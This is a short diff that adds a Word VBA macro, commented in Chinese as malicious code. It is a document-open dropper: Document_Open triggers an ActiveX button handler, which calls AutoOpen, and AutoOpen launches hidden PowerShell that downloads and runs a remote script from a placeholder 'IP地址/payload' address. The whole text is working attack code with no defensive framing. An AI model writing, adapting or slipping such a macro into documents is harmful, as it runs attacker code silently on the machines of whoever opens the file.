@@ -1,0 +1,18 @@
+' 恶意代码
+Sub AutoOpen()
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    Dim strCmd As String
+    strCmd = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP地址/payload/active.ps1')"
+    ws.Run strCmd, 0, False
+End Sub
+
+' ActiveX控件的事件处理代码
+Private Sub CommandButton1_Click()
+    Call AutoOpen
+End Sub
+
+' 文档打开时自动点击按钮的代码
+Private Sub Document_Open()
+    CommandButton1_Click
+End Sub
